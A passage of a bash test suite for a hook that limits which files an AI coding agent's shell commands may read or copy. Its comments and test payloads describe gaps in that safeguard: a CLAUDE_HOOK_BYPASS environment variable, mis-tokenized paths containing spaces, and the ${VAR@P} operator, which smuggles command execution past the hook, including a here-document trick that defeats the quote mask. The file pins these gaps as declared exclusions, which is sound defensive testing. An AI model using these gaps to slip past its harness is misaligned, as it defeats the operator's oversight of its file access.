  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "<quoted-expansion>"

# ----- Allowed roots — should pass (exit 0) -----

test_case "cat inside Claude allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/CLAUDE.md')" 0

test_case "cat relative inside workspace allowed (cwd is workspace)" \
  "$(bash_payload 'cat README.md' ''"$HOME"'/Claude')" 0

test_case "cp inside Claude allowed" \
  "$(bash_payload 'cp '"$HOME"'/Claude/CLAUDE.md /tmp/c.bak')" 0

test_case "cat /tmp/foo allowed" \
  "$(bash_payload 'cat /tmp/foo')" 0

test_case "cat ~/Downloads allowed (operator-confirmed root)" \
  "$(bash_payload 'cat ~/Downloads/install.dmg.txt')" 0

test_case "cat ~/.claude config allowed" \
  "$(bash_payload 'cat ~/.claude/settings.json')" 0

# NOTE: Cowork install path contains "Application Support" with a space.
# Per documented v1 limitation (whitespace-tokenization shared with
# block-rm-prefer-trash.sh), unquoted paths-with-spaces tokenize into
# `$HOME/Library/Application` (blocked) plus
# `Support/...` (orphan token, skipped). Real-world Cowork access flows
# through `./deploy.sh --deploy` which is on the script-execution allowlist;
# the internal `cp` calls happen inside the script's bash subprocess and
# the hook never sees them. Direct unquoted cat of paths-with-spaces is
# accepted v1 residual per bypass-mode-readiness.md § Known Limitations.
# The arm runs under the fixture home (HOME-FIXTURE-01), whose install path no allowlist
# row names, so it pins that the unquoted form blocks; it no longer tells the
# tokenization apart from an unlisted home.
test_case "Cowork install path quoted-form blocks (v1 limitation — unquoted whitespace path tokenizes)" \
  "$(bash_payload 'cat '"$FSB_FIXTURE_HOME"'/Library/Application Support/Claude/local-agent-mode-sessions/foo/skills/daily-status/SKILL.md')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- Verbs that are NOT in v1 scope — should pass through (out-of-scope = allow) -----

test_case "grep not in v1 scope — allowed (out of scope by design)" \
  "$(bash_payload 'grep secret ~/Documents/file.txt')" 0

test_case "find not in v1 scope — allowed" \
  "$(bash_payload 'find ~/Documents -type f')" 0

test_case "ls not in v1 scope — allowed" \
  "$(bash_payload 'ls ~/Documents')" 0

# ----- Non-Bash tool calls — early exit -----

test_case "Read tool early exit" \
  '{"tool_name": "Read", "tool_input": {"file_path": "$HOME/Documents/foo"}}' 0

test_case "Edit tool early exit" \
  '{"tool_name": "Edit", "tool_input": {"file_path": "$HOME/Desktop/foo"}}' 0

# ----- CLAUDE_HOOK_BYPASS escape hatch -----

test_case "bypass env var allows blocked cat" \
  "$(bash_payload 'cat ~/Documents/foo')" 0 "" "CLAUDE_HOOK_BYPASS=1"

test_case "bypass env var allows blocked cp" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 0 "" "CLAUDE_HOOK_BYPASS=1"

# ----- Absolute-path-aware verb anchor -----

test_case "/bin/cat outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/bin/cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "/usr/bin/cp outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/usr/bin/cp ~/Desktop/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002" "$FSB_HOME_ENV"

# ----- Chained-command tokenizer (F1 split) -----

test_case "ls && cat ~/Documents blocks (chained)" \
  "$(bash_payload 'ls && cat ~/Documents/foo')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

test_case "echo hi; cat ~/Desktop blocks (chained)" \
  "$(bash_payload 'echo hi; cat ~/Desktop/foo')" 2 "BLOCK-FS-BOUNDARY-001" "$FSB_HOME_ENV"

# ----- Warn-mode behavior (.mode = warn → exit 0 with WARN log) -----

test_warn_case() {
  local name="$1"; local payload="$2"
  local env_var="${3:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'warn' > "$MODE_FILE"
  if [ -n "$env_var" ]; then
    /usr/bin/printf '%s' "$payload" | /usr/bin/env "$env_var" /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  else
    /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  fi
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != 0 ] && ok=0
  if ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "WARN"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0 with WARN in stderr)\n  stderr: %s\n' "$name" "$actual_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

test_warn_case "warn-mode cat ~/Documents emits WARN exit 0" \
  "$(bash_payload 'cat ~/Documents/foo')" "$FSB_HOME_ENV"

test_warn_case "warn-mode cp source outside emits WARN exit 0" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" "$FSB_HOME_ENV"

# ----- Off-mode behavior (.mode = off → exit 0 silently) -----

test_off_case() {
  local name="$1"; local payload="$2"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'off' > "$MODE_FILE"
  /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  /bin/rm -f "$tmp_stderr"
  if [ "$actual_exit" = 0 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0)\n' "$name" "$actual_exit"
    FAIL=$((FAIL + 1))
  fi
}

test_off_case "off-mode cat ~/Documents silently allowed" \
  "$(bash_payload 'cat ~/Documents/foo')"

# ----- Empty/no-target commands — allow -----

test_case "bare cat with no args allowed" \
  "$(bash_payload 'cat')" 0

test_case "cat with all flags (no targets) allowed" \
  "$(bash_payload 'cat -n')" 0

# ----- Missing-jq dependency gate (GHSA-9cjm-v22x-4x33 regression) -----
# jq resolution now lives in the shared helper lib/dep-resolve.sh, so simulating
# missing jq requires sandboxing BOTH files: a copy of the hook plus a copy of
# the helper with all three jq candidate paths rewritten to nonexistent
# locations. This hook is mode-gated: a control that cannot parse its input must
# DENY in enforce mode (exit 2) and DEGRADE (exit 0, never block harder than a
# rule match) in warn mode.
_sb="$(/usr/bin/mktemp -d)"
/bin/mkdir -p "$_sb/lib"
/bin/cp "$HOOK" "$_sb/block-fs-boundary.sh"; /bin/chmod +x "$_sb/block-fs-boundary.sh"
/usr/bin/sed \
  -e 's#/usr/bin/jq#/nonexistent/jq-a#g' \
  -e 's#/opt/homebrew/bin/jq#/nonexistent/jq-b#g' \
  -e 's#/usr/local/bin/jq#/nonexistent/jq-c#g' \
  "${HOOK_DIR}/lib/dep-resolve.sh" > "$_sb/lib/dep-resolve.sh"
_sb_hook="$_sb/block-fs-boundary.sh"
_sb_payload='{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}'

# enforce mode → fail CLOSED (exit 2 + DEPENDENCY-MISSING)
/usr/bin/printf 'enforce' > "$_sb/.mode"
_jqmiss_exit=0
_jqmiss_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqmiss_exit="$?"
if [ "$_jqmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_jqmiss_err" | /usr/bin/grep -qE 'DEPENDENCY-MISSING'; then
  /usr/bin/printf 'PASS: jq missing (enforce) → fail CLOSED (exit 2 + DEPENDENCY-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (enforce) → expected exit 2 + DEPENDENCY-MISSING, got exit=%s\n  stderr: %s\n' "$_jqmiss_exit" "$_jqmiss_err"; FAIL=$((FAIL + 1))
fi

# warn mode → DEGRADE (exit 0 + DEPENDENCY-DEGRADED); must not block harder than a match
/usr/bin/printf 'warn' > "$_sb/.mode"
_jqwarn_exit=0
_jqwarn_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqwarn_exit="$?"
if [ "$_jqwarn_exit" = 0 ] && /usr/bin/printf '%s' "$_jqwarn_err" | /usr/bin/grep -qE 'DEPENDENCY-DEGRADED'; then
  /usr/bin/printf 'PASS: jq missing (warn) → degrade (exit 0 + DEPENDENCY-DEGRADED)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (warn) → expected exit 0 + DEPENDENCY-DEGRADED, got exit=%s\n  stderr: %s\n' "$_jqwarn_exit" "$_jqwarn_err"; FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$_sb"

# ----- Missing dependency helper → fail CLOSED (GHSA-9cjm-v22x-4x33) -----
# If lib/dep-resolve.sh is unreadable, bash 3.2 exits 1 on the failed source
# (non-blocking) — the readability guard converts that to a blocking exit 2.
_sb2="$(/usr/bin/mktemp -d)"
/bin/cp "$HOOK" "$_sb2/block-fs-boundary.sh"; /bin/chmod +x "$_sb2/block-fs-boundary.sh"
/usr/bin/printf 'enforce' > "$_sb2/.mode"   # no $_sb2/lib/dep-resolve.sh created
_libmiss_exit=0
_libmiss_err="$(/usr/bin/printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}' | /bin/bash "$_sb2/block-fs-boundary.sh" 2>&1 >/dev/null)" || _libmiss_exit="$?"
/bin/rm -rf "$_sb2"
if [ "$_libmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_libmiss_err" | /usr/bin/grep -qE 'LIB-MISSING'; then
  /usr/bin/printf 'PASS: dep helper missing → fail CLOSED (exit 2 + LIB-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: dep helper missing → expected exit 2 + LIB-MISSING, got exit=%s\n  stderr: %s\n' "$_libmiss_exit" "$_libmiss_err"; FAIL=$((FAIL + 1))
fi

# ==========================================================================
# XFORM — the parameter-transformation operator: a DECLARED exclusion from G2
# ==========================================================================
# On a shell that implements it, `${VAR@P}` re-expands the variable's VALUE as a prompt
# string, which performs command substitution: an execution surface with no `$(` and no
# backtick for G2's two globs to see. G2 does not refuse it, and that is a decision, not
# an oversight — the readiness fragment declares it and says why. These arms PIN the
# current verdicts so a later change to any of them is deliberate.
#
# Every verdict the HOOK gives in this section is LEXICAL: the hook never executes a
# payload, so the hook arms are evaluable on any host. Two arms assert shell behaviour
# instead: XFORM-RESID-04 observes three value forms run on /bin/bash, and XFORM-SEM-01
# demonstrates that the operator EXECUTES, reporting NOT-EVALUATED — never a pass — on an
# interpreter that rejects it.
#
# A PIN SAYS WHICH VERDICT IT PINS. Sixteen pins assert the exit code AND either the
# number of -004 records the call wrote or the rule its refusal names, because one exit
# code can come from different guards: G6 admits with a record, G4 admits silently, a word
# the token walk never hands to the cascade writes nothing, G1 refuses under -003 and G5,
# for a read verb, under -001. The three near misses assert only that they are admitted,
# as the card's AC-3 asks.
#
# EVERY PIN IS PAIRED, ON EVERY DIMENSION IT ASSERTS. A pin is green on the shipped hook
# by construction, so for each dimension it asserts a pairing arm runs the pin's OWN
# predicate through a sandbox copy of the hook mutated for that dimension, and passes only
# when that predicate FAILS there and the copy gives the verdict its mutation produces.
# Every copy is shape-guarded (XFORM-MUT-SHAPE-*): exactly the lines it takes out and puts
# in against the shipped hook, it parses, it still refuses an untouched out-of-root
# literal under -001, and it still admits an untouched in-root one — so a pin fails there
# because of the mutation, not because the copy is dead.
#   R    G6 refuses (return 3 -> return 2)                  exit dimension of every G6 admit
#   S    G6 writes no record (its advise call -> :)        record dimension of every G6 admit
#   G1A  G1 admits (return 2 -> return 3)                   exit dimension of the G1 refusal
#   G1O  G1 refuses as outside (return 2 -> return 1)       rule dimension of the G1 refusal
#   G4R  G4 records (return 0 -> return 3)                  record dimension of the G4 admit
#   G4X  G4 refuses (return 0 -> return 2)                  exit dimension of the G4 admit
#   G5A  G5 admits (return 4 -> return 0)                   exit dimension of the G5 refusal
#   G5S  G5 refuses as unresolvable (return 4 -> return 2)  rule dimension of the G5 refusal
#   F    the walk hands a flag-position word to the cascade  record dimension of XFORM-POS-01
#   FR   F, and G6 refuses                                   exit dimension of XFORM-POS-01
#   W    the walk hands every word of every segment over     record dimension of XFORM-POS-02
#   WR   W, and G6 refuses                                   exit dimension of XFORM-POS-02
#   A    the walk keeps a redirection's & in the segment    record dimension of XFORM-POS-03
#   AR   A, and G6 refuses                                   exit dimension of XFORM-POS-03
#   L    the walk joins a continuation line to its line     record dimension of XFORM-POS-04
#   LR   L, and G6 refuses                                   exit dimension of XFORM-POS-04
# The document arms XFORM-DOC-01 and -02 are paired on both halves: the document half by
# the XFORM-DOC-03 mutants, the hook half by XFORM-MUT-01. XFORM-RESID-04 and XFORM-SEM-01
# assert shell behaviour rather than hook behaviour; their own control (a direct
# substitution runs) and near miss (a plain brace form does not) are their pairing.
#
# NO PIPELINES ANYWHERE IN THIS BLOCK, for the reason MODEOFF-REC gives above: every
# payload reaches a hook from a FILE, and every count is one awk pass over a file.
echo ""
echo "the parameter-transformation operator — a declared exclusion from G2 (XFORM-*)"
echo "---"

XFORM_NL='
'

# xform_rec_count <warn log> -> integer count of the -004 records in it. One awk pass with
# index(), as modeoff_rec_count above, so a zero is a reading and not an exit status.
xform_rec_count() {
  if [ ! -f "$1" ]; then /usr/bin/printf '0'; return 0; fi
  /usr/bin/awk 'index($0, "BLOCK-FS-BOUNDARY-004") { n++ } END { printf "%d", n + 0 }' "$1"
}

# xform_observe <hook dir> <command> — one call of <hook dir>/block-fs-boundary.sh at that
# directory's .mode, the payload fed from a FILE. Sets XO_EXIT (its exit code), XO_REC (the
# -004 records the call wrote to that directory's own warn log) and XO_ERR (its stderr).
XO_EXIT=0
XO_REC=0
XO_ERR=""
xform_observe() {
  local xo_dir="$1" xo_pf xo_ef xo_before xo_after
  xo_pf="$(/usr/bin/mktemp)"
  xo_ef="$(/usr/bin/mktemp)"
  /usr/bin/printf '%s' "$(bash_payload "$2")" > "$xo_pf"
  xo_before="$(xform_rec_count "${xo_dir}/fs-boundary-warn-log.jsonl")"
  XO_EXIT=0
  /bin/bash "${xo_dir}/block-fs-boundary.sh" < "$xo_pf" > /dev/null 2> "$xo_ef" || XO_EXIT="$?"
  xo_after="$(xform_rec_count "${xo_dir}/fs-boundary-warn-log.jsonl")"
  XO_REC=$((xo_after - xo_before))
  XO_ERR="$(/bin/cat "$xo_ef")"
  /bin/rm -f "$xo_pf" "$xo_ef"
}

# xform_holds <hook dir> <command> <exit> <kind> [<want>] — the ONE predicate a pin and its
# pairing arms share. 0 when the hook in <hook dir> gives <exit> and, by <kind>:
#   rec    exactly <want> -004 records written by the call
#   rule   stderr names the rule <want>
#   none   nothing further
# The XO_* values it leaves are the verdict of the one call it made.
xform_holds() {
  xform_observe "$1" "$2"
  [ "$XO_EXIT" = "$3" ] || return 1
  case "$4" in
    rec)  [ "$XO_REC" = "${5:-}" ] ;;
    rule) case "$XO_ERR" in *"${5:-no-rule-named}"*) return 0 ;; *) return 1 ;; esac ;;
    none) return 0 ;;
    *)    return 1 ;;
  esac
}

# xform_pin <label> <command> <exit> <kind> [<want>] — a pin: the SHIPPED hook holds it.
xform_pin() {
  if xform_holds "$HOOK_DIR" "$2" "$3" "$4" "${5:-}"; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s; -004 records written=%s; want %s %s)\n  stderr: %s\n' \
      "$1" "$XO_EXIT" "$3" "$XO_REC" "$4" "${5:-}" "$XO_ERR"
    FAIL=$((FAIL + 1))
  fi
}

# xform_pair <label> <copy> <command> <exit> <kind> <want> <copy exit> <copy records> <copy rule>
#   The pin's own predicate (<exit> <kind> <want>), run through the copy in <copy>, must
#   FAIL; and that copy must give <copy exit> with <copy records> -004 records, naming
#   <copy rule> on stderr unless it is `-` — the verdict its mutation produces, so the pin
#   is red there for that reason and no other.
xform_pair() {
  local xp_ok=1 xp_why=""
  if xform_holds "$2" "$3" "$4" "$5" "$6"; then
    xp_ok=0; xp_why="${xp_why} the pin still HOLDS through this copy, so it cannot go red here;"
  fi
  if [ "$XO_EXIT" != "$7" ]; then xp_ok=0; xp_why="${xp_why} copy exit=${XO_EXIT}, want ${7};"; fi
  if [ "$XO_REC" != "$8" ]; then xp_ok=0; xp_why="${xp_why} copy records=${XO_REC}, want ${8};"; fi
  if [ "$9" != "-" ]; then
    case "$XO_ERR" in
      *"$9"*) : ;;
      *) xp_ok=0; xp_why="${xp_why} copy stderr does not name ${9};" ;;
    esac
  fi
  if [ "$xp_ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s —%s\n  stderr: %s\n' "$1" "$xp_why" "$XO_ERR"
    FAIL=$((FAIL + 1))
  fi
}

# xform_copy <name> <sed edit>... — <base>/<name>/hooks/block-fs-boundary.sh: the shipped
# hook with each edit applied in turn, beside a copy of its lib/, the allowlist and a .mode
# of enforce, so it resolves as the shipped hook does and writes its own warn log. Prints
# the copy's hook directory.
XFORM_BASE="$(/usr/bin/mktemp -d)"
xform_copy() {
  local xc_dir="${XFORM_BASE}/${1}/hooks" xc_edit
  shift
  /bin/mkdir -p "$xc_dir"
  /bin/cp -R "${HOOK_DIR}/lib" "${xc_dir}/lib"
  /bin/cp "${HOOK_DIR}/../fs-boundary-allowlist.txt" "${xc_dir}/../fs-boundary-allowlist.txt"
  /bin/cp "$HOOK" "${xc_dir}/block-fs-boundary.sh"
  for xc_edit in "$@"; do
    /usr/bin/sed -e "$xc_edit" "${xc_dir}/block-fs-boundary.sh" > "${xc_dir}/next.sh"
    /bin/mv "${xc_dir}/next.sh" "${xc_dir}/block-fs-boundary.sh"
  done
  /bin/chmod +x "${xc_dir}/block-fs-boundary.sh"
  /usr/bin/printf 'enforce' > "${xc_dir}/.mode"
  /usr/bin/printf '%s' "$xc_dir"
}

# The edits. Each names the one line it changes, and each such line occurs exactly once in
# the hook; the shape guards below fail the moment one stops matching.
XFORM_X_R='s/^  return 3$/  return 2/'
# shellcheck disable=SC2016  # a sed program, not an expansion
XFORM_X_S='s/^        advise_unresolvable "\$verb" "\$token"$/        :/'
# shellcheck disable=SC2016
XFORM_X_G1A='s/^\(    \*"\$CMDPOS_SENTINEL"\*) \)return 2;;$/\1return 3;;/'
# shellcheck disable=SC2016
XFORM_X_G1O='s/^\(    \*"\$CMDPOS_SENTINEL"\*) \)return 2;;$/\1return 1;;/'
XFORM_X_G4R='s/^        0) return 0;;$/        0) return 3;;/'
XFORM_X_G4X='s/^        0) return 0;;$/        0) return 2;;/'
XFORM_X_G5A='s/; return 4;;$/; return 0;;/'
XFORM_X_G5S='s/; return 4;;$/; return 2;;/'
XFORM_X_F='s/^          if (substr(t, 1, 1) == "-") continue;$/          t = t;/'
XFORM_X_W1='s/^        if (first_token != v) continue;$/        first_token = v;/'
XFORM_X_W2='s/^        for (i = first + 1; i <= m; i++) {$/        for (i = first; i <= m; i++) {/'
# A and L both change the walk's split line, each in a copy of its own. The walk ends a
# segment at every `&` and the canonicalizer starts a command after one, so A takes a
# redirection's `&` and the separator after it out of the record before the split, and the
# verb's segment runs on past the redirection. The walk reads one physical line per awk
# record, so L joins a line that ends in a backslash to the line after it before the split,
# as the shell does.
# shellcheck disable=SC2016
XFORM_X_A='s#^      n = split(\$0, segments, /\[;&|\]+/);$#      gsub(/[<>]\&; /, ">"); n = split($0, segments, /[;\&|]+/);#'
# shellcheck disable=SC2016
XFORM_X_L='s#^      n = split(\$0, segments, /\[;&|\]+/);$#      while ($0 ~ /\\\\$/ \&\& (getline nx) > 0) $0 = substr($0, 1, length($0) - 1) " " nx; n = split($0, segments, /[;\&|]+/);#'

XFORM_R="$(xform_copy r "$XFORM_X_R")"
XFORM_S="$(xform_copy s "$XFORM_X_S")"
XFORM_G1A="$(xform_copy g1a "$XFORM_X_G1A")"
XFORM_G1O="$(xform_copy g1o "$XFORM_X_G1O")"
XFORM_G4R="$(xform_copy g4r "$XFORM_X_G4R")"
XFORM_G4X="$(xform_copy g4x "$XFORM_X_G4X")"
XFORM_G5A="$(xform_copy g5a "$XFORM_X_G5A")"
XFORM_G5S="$(xform_copy g5s "$XFORM_X_G5S")"
XFORM_F="$(xform_copy f "$XFORM_X_F")"
XFORM_FR="$(xform_copy fr "$XFORM_X_F" "$XFORM_X_R")"
XFORM_W="$(xform_copy w "$XFORM_X_W1" "$XFORM_X_W2")"
XFORM_WR="$(xform_copy wr "$XFORM_X_W1" "$XFORM_X_W2" "$XFORM_X_R")"
XFORM_A="$(xform_copy a "$XFORM_X_A")"
XFORM_AR="$(xform_copy ar "$XFORM_X_A" "$XFORM_X_R")"
XFORM_L="$(xform_copy l "$XFORM_X_L")"
XFORM_LR="$(xform_copy lr "$XFORM_X_L" "$XFORM_X_R")"

# xform_shape <label> <copy> <lines out> <lines in> — the copy's shape against the shipped
# hook: exactly <lines out> taken out and <lines in> put in, it parses, it refuses an
# untouched out-of-root literal under -001, and it admits an untouched in-root literal.
xform_shape() {
  local xs_d xs_o xs_n xs_why=""
  xs_d="$(/usr/bin/mktemp)"
  /usr/bin/diff "$HOOK" "${2}/block-fs-boundary.sh" > "$xs_d" 2>/dev/null
  xs_o="$(/usr/bin/awk '/^</ { n++ } END { printf "%d", n + 0 }' "$xs_d")"
  xs_n="$(/usr/bin/awk '/^>/ { n++ } END { printf "%d", n + 0 }' "$xs_d")"
  /bin/rm -f "$xs_d"
  if [ "$xs_o" != "$3" ] || [ "$xs_n" != "$4" ]; then
    xs_why="${xs_why} lines -${xs_o}/+${xs_n}, want -${3}/+${4} (an edit no longer targets its line: re-point it, never delete the arm);"
  fi
  /bin/bash -n "${2}/block-fs-boundary.sh" 2>/dev/null || xs_why="${xs_why} the copy does not parse;"
  xform_observe "$2" 'cat /Users/otheruser/notes.txt'
  if [ "$XO_EXIT" != 2 ]; then
    xs_why="${xs_why} liveness: an out-of-root literal exit ${XO_EXIT}, want 2;"
  else
    case "$XO_ERR" in
      *BLOCK-FS-BOUNDARY-001*) : ;;
      *) xs_why="${xs_why} liveness: the out-of-root refusal is not -001;" ;;
    esac
  fi
  xform_observe "$2" 'cat /tmp/ok.txt'
  if [ "$XO_EXIT" != 0 ]; then xs_why="${xs_why} specificity: an in-root literal exit ${XO_EXIT}, want 0;"; fi
  if [ -z "$xs_why" ]; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s —%s\n' "$1" "$xs_why"; FAIL=$((FAIL + 1))
  fi
}
xform_shape "XFORM-MUT-SHAPE-R: the copy whose G6 refuses differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_R" 1 1
xform_shape "XFORM-MUT-SHAPE-S: the copy whose G6 writes no record differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_S" 1 1
xform_shape "XFORM-MUT-SHAPE-G1A: the copy whose G1 admits differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G1A" 1 1
xform_shape "XFORM-MUT-SHAPE-G1O: the copy whose G1 refuses as outside differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G1O" 1 1
xform_shape "XFORM-MUT-SHAPE-G4R: the copy whose G4 records differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G4R" 1 1
xform_shape "XFORM-MUT-SHAPE-G4X: the copy whose G4 refuses differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G4X" 1 1
xform_shape "XFORM-MUT-SHAPE-G5A: the copy whose G5 admits differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G5A" 1 1
xform_shape "XFORM-MUT-SHAPE-G5S: the copy whose G5 refuses as unresolvable differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G5S" 1 1
xform_shape "XFORM-MUT-SHAPE-F: the copy whose walk hands flag-position words over differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_F" 1 1
xform_shape "XFORM-MUT-SHAPE-FR: F with G6 refusing differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_FR" 2 2
xform_shape "XFORM-MUT-SHAPE-W: the copy whose walk hands every word of every segment over differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_W" 2 2
xform_shape "XFORM-MUT-SHAPE-WR: W with G6 refusing differs in three lines, parses, and still refuses and admits untouched literals" "$XFORM_WR" 3 3
xform_shape "XFORM-MUT-SHAPE-A: the copy whose walk keeps a redirection's ampersand in the verb's segment differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_A" 1 1
xform_shape "XFORM-MUT-SHAPE-AR: A with G6 refusing differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_AR" 2 2
xform_shape "XFORM-MUT-SHAPE-L: the copy whose walk joins a continuation line to the line it continues differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_L" 1 1
xform_shape "XFORM-MUT-SHAPE-LR: L with G6 refusing differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_LR" 2 2

# ----- XFORM-SUBJ / XFORM-PFX: the measured pair, and what the pair hides -----
# shellcheck disable=SC2016  # payload text, not expansions
XFORM_C_SUBJ='cat ${CFG@P}'
xform_pin "XFORM-SUBJ-01: unquoted \${VAR@P} is ADMITTED under G6 with exactly one -004 record (declared exclusion)" \
  "$XFORM_C_SUBJ" 0 rec 1
xform_pair "XFORM-SUBJ-01-PAIR-exit: through the copy whose G6 refuses, the same operand is refused — SUBJ-01's exit reads a live G6" \
  "$XFORM_R" "$XFORM_C_SUBJ" 0 rec 1   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-SUBJ-01-PAIR-rec: through the copy whose G6 writes no record, the same operand is admitted silently — SUBJ-01's record is G6's" \
  "$XFORM_S" "$XFORM_C_SUBJ" 0 rec 1   0 0 -

# shellcheck disable=SC2016
XFORM_C_QUOTED='cat "${CFG@P}"'
xform_pin "XFORM-SUBJ-02: QUOTED \${VAR@P} is refused under -003 — by G1, which refuses every quoted brace" \
  "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-SUBJ-02-PAIR-exit: through the copy whose G1 admits, the same quoted operand is admitted with a record — SUBJ-02's refusal is G1's" \
  "$XFORM_G1A" "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003   0 1 -
xform_pair "XFORM-SUBJ-02-PAIR-rule: through the copy whose G1 refuses as outside, the refusal names -001 — SUBJ-02's -003 reads a live rule" \
  "$XFORM_G1O" "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001

# The quoted refusal exists only while the canonicalizer's quote mask does. Unbalanced
# quotes hand the command back unchanged; an apostrophe in a here-document body is
# enough, and the command is still valid shell. Step 1 then strips the quotes and the
# operand is read as its unquoted spelling — so the difference between the two spellings
# is G1's, not a judgment about the operator.
XFORM_C_NOMASK="cat <<'EOF' > /tmp/x.txt${XFORM_NL}it's${XFORM_NL}EOF${XFORM_NL}cat \"\${CFG@P}\""
xform_pin "XFORM-SUBJ-03: QUOTED \${VAR@P} with the quote mask unavailable is ADMITTED like the unquoted form, one -004 record (declared exclusion)" \
  "$XFORM_C_NOMASK" 0 rec 1
xform_pair "XFORM-SUBJ-03-PAIR-exit: through the copy whose G6 refuses, the same command is refused — SUBJ-03 is admitted by G6, not by G1" \
  "$XFORM_R" "$XFORM_C_NOMASK" 0 rec 1   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-SUBJ-03-PAIR-rec: through the copy whose G6 writes no record, the same command writes none — SUBJ-03's record is G6's" \
  "$XFORM_S" "$XFORM_C_NOMASK" 0 rec 1   0 0 -

# shellcheck disable=SC2016
XFORM_C_PFXIN='cat /tmp/${CFG@P}'
xform_pin "XFORM-PFX-01: behind an in-root literal prefix the operator is ADMITTED under G4 and writes NO record (declared exclusion)" \
  "$XFORM_C_PFXIN" 0 rec 0
xform_pair "XFORM-PFX-01-PAIR-rec: through the copy whose G4 records, the same operand writes one record — PFX-01's zero is read on a live record" \
  "$XFORM_G4R" "$XFORM_C_PFXIN" 0 rec 0   0 1 -
xform_pair "XFORM-PFX-01-PAIR-exit: through the copy whose G4 refuses, the same operand is refused — PFX-01's admit is G4's" \
  "$XFORM_G4X" "$XFORM_C_PFXIN" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003

# shellcheck disable=SC2016
XFORM_C_PFXOUT='cat /etc/${CFG@P}'
xform_pin "XFORM-PFX-02: behind an out-of-root literal prefix the operand is refused by the prefix rule (-001), not by G2" \
  "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-001
xform_pair "XFORM-PFX-02-PAIR-exit: through the copy whose G5 admits, the same operand is admitted silently — PFX-02's refusal is G5's" \
  "$XFORM_G5A" "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-001   0 0 -
xform_pair "XFORM-PFX-02-PAIR-rule: through the copy whose G5 refuses as unresolvable, the refusal names -003 — PFX-02's -001 reads a live rule" \
  "$XFORM_G5S" "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-001   2 0 BLOCK-FS-BOUNDARY-003

# ----- The exclusion covers the operator POSITION, not one letter -----
# xform_g6_pin <label> <command> — a G6 pin (exit 0, one record) with both of its pairing
# arms: R must refuse the command, S must admit it silently.
